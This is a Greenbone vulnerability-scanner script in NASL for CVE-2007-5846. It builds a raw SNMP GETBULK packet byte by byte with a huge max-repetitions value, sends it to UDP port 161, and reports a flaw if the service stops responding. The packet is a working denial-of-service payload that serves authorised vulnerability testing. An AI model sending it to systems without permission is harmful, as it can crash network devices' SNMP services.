# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147136");
  script_version("2023-08-10T05:05:53+0000");
  script_tag(name:"last_modification", value:"2023-08-10 05:05:53 +0000 (Thu, 10 Aug 2023)");
  script_tag(name:"creation_date", value:"2021-11-11 08:31:12 +0000 (Thu, 11 Nov 2021)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");

  script_cve_id("CVE-2007-5846");

  script_tag(name:"qod_type", value:"remote_probe");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("SNMP GETBULK DoS Vulnerability (CVE-2007-5846) - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_snmp_info_collect.nasl");
  script_mandatory_keys("SNMP/sysdescr/available");
  script_require_udp_ports("Services/udp/snmp", 161);

  script_tag(name:"summary", value:"Some SNMP agents are prone to a denial of service (DoS)
  vulnerability when receiving a GETBULK request with a large max-repeaters value.");

  script_tag(name:"vuldetect", value:"Sends a crafted SNMP request and checks if the service is
  still reachable afterwards.

  Note: For a successful detection the remote SNMP service either needs to accept a default 'public'
  SNMPv1 / SNMPv2c community or a valid one needs to be given in the credentials configuration of
  the scanning task.");

  script_tag(name:"solution", value:"Contact your vendor for updates.");

  exit(0);
}

include("snmp_func.inc");

port = snmp_get_port(default: 161);

community = snmp_get_community(port: port);
if (!community || community == "")
  exit(0);

if (!snmp_get(port: port, oid: "1.3.6.1.2.1.1.1.0", community: community))
  exit(0);

soc = open_sock_udp(port);
if (!soc)
  exit(0);

size = strlen(community);
sz = size % 256;

data = raw_string(0x30, 0x2b,
                  0x02, 0x01, 0x01, 0x04, sz);

data += community +
        raw_string(0xa5, 0x1e, 0x02, 0x04, # getBulkRequest
                   0x28, 0xd5, 0x97, 0xf9, # request-id
                   0x02, 0x01,
                   0x00,                   # non-repeaters
                   0x02, 0x03,
                   0x03, 0xa9, 0x80,       # max-repetitions (240000)
                   0x30, 0x0e, 0x30, 0x0c,
                   0x06, 0x08,
                   0x2b, 0x06, 0x01, 0x02, # Object Name: 1.3.6.1.2.1.1.1.0
                   0x01, 0x01, 0x01, 0x00,
                   0x05, 0x00);

send(socket: soc, data: data);
recv = recv(socket: soc, length: 4096, timeout: 3);
close(soc);

if (!recv) {
  if (!snmp_get(port: port, oid: "1.3.6.1.2.1.1.1.0", community: community)) {
    report = "The SNMP service did not response anymore after sending a GETBULK packet with a large max-repeaters value.";
    security_message(port: port, data: report, proto: "udp");
    exit(0);
  }
}

exit(99);